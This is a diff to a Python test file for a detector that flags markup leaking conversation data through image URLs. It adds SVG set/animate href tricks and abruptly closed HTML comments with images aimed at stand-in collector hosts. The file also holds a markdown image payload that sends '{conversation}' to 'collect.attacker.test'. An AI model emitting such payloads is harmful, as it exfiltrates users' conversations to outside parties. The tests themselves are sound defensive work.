@@ -593,6 +593,15 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["uncheckable_markup"],
         ),
         ("<div><object></object><video><source src='https://a.test/a.mp4'></video></div>", []),
+        (
+            "<svg><image><set attributeName='href' to='https://collector.test/p;{conversation}.png'/></image></svg>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<svg><image><animate attributeName='href' values='/a.png;https://collector.test/{c}.png'/></image></svg>",
+            ["exfiltration_query"],
+        ),
+        ("<div><!-- note --><img src='https://a.test/a.png'></div>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
@@ -739,6 +748,23 @@ def test_repeated_comment_openers_in_script_are_linear() -> None:
     assert exfiltration_link_classes(text) == []
     # A quadratic scan takes most of a second here on a laptop; a linear one a few milliseconds.
     assert time.perf_counter() - started < 0.5
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "<div><!--><img src='https://collector.test/{conversation}.png'>--></div>",
+        "<div><!---><img src='https://collector.test/{c}.png'>--></div>",
+        "<div><!-- a --!><img src='https://collector.test/{c}.png'>--></div>",
+    ],
+    ids=["empty", "empty-dash", "bang-close"],
+)
+def test_abruptly_closed_comments_are_flagged(text: str) -> None:
+    # Newer Python tokenizers close these comments as browsers do and find the image; older ones read on
+    # to "-->", and the markup fails closed instead.
+    found = exfiltration_link_classes(text)
+    assert found
+    assert set(found) <= {"exfiltration_query", "uncheckable_markup"}
 
 
 def test_oversized_text_without_markup_passes() -> None:
